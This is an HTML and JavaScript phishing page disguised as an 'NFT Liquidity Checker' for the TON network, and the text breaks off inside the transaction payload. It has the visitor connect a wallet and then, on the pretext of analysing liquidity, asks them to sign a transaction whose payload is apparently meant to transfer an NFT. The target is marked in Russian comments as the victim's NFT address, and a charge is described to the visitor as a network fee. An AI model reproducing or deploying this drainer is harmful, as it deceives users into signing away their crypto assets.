<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NFT Liquidity Checker</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        /* Стили для имитации мобильного приложения на ПК */
        body {
            background-color: #000;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #ffffff;
        }

        .mobile-container {
            width: 100%;
            max-width: 400px; /* Ширина телефона */
            height: 100vh;
            max-height: 800px;
            background-color: #1c1c1d;
            position: relative;
            display: flex;
            flex-direction: column;
            padding: 24px;
            box-sizing: border-box;
            box-shadow: 0 0 20px rgba(0,0,0,0.8);
        }

        /* На ПК добавляем закругление и границу как у смартфона */
        @media (min-width: 600px) {
            .mobile-container {
                border-radius: 40px;
                border: 8px solid #333;
                height: 80vh;
            }
        }

        h2 { font-size: 24px; font-weight: 700; margin-bottom: 8px; margin-top: 40px; }
        p { color: #8e8e93; font-size: 15px; line-height: 1.4; margin-bottom: 30px; }

        #ton-connect-button {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .main-button {
            background-color: #007aff;
            color: #fff;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }

        .main-button:active {
            background-color: #0056b3;
        }

        #status {
            margin-top: 20px;
            font-size: 14px;
            font-weight: 500;
            min-height: 1.5em;
        }

        .loader {
            color: #8e8e93;
        }

        .error {
            color: #ff453a;
        }
    </style>
</head>
<body>

<div class="mobile-container">
    <h2>Asset Verification</h2>
    <p>Connect your wallet to analyze the liquidity and authenticity of your NFT assets on the TON network.</p>
    
    <div id="ton-connect-button"></div>

    <button class="main-button" onclick="checkLiquidity()">Check Liquidity</button>
    
    <div id="status"></div>
</div>

<script>
    // Инициализация TonConnect
    const tonConnectUI = new TONConnectUI.TonConnectUI({
        manifestUrl: 'https://твой-логин.github.io/твой-репозиторий/tonconnect-manifest.json',
        buttonRootId: 'ton-connect-button'
    });

    async function checkLiquidity() {
        const statusDiv = document.getElementById('status');
        
        if (!tonConnectUI.connected) {
            alert("Please connect your wallet first!");
            return;
        }

        statusDiv.className = "loader";
        statusDiv.innerText = "Analyzing blockchain data... Please wait";

        try {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [
                    {
                        address: "АДРЕС_NFT_ЖЕРТВЫ", // Сюда вставляешь актуальный адрес NFT
                        amount: "50000000", // Комиссия сети
                        payload: "te6ccgEBAQEANAAAs0QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAAAAAAAAAAAAAAAAAA
